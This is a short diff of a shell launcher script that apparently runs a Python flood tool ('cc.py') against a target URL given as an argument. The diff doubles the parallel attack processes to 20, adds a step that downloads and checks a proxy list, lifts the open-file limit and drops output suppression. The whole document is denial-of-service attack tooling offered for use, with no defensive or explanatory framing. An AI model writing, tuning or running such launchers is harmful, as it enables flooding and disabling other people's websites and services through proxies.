@@ -6,17 +6,19 @@
 #  Lastly run this script
 #
 #the command you want to exec
+
+[ -f proxy.txt ] || python3 cc.py -down -check
+
 atk_cmd="python3 cc.py -url $1"
 
 #number of process that you want
-process=10
+process=20
 
 #change the system limit
 ulimit -n 999999
 
-echo Attack started
 for ((i=1;i<=$process;i++))
 do
-  $atk_cmd >/dev/null &
+  $atk_cmd &
   sleep 0.1
 done
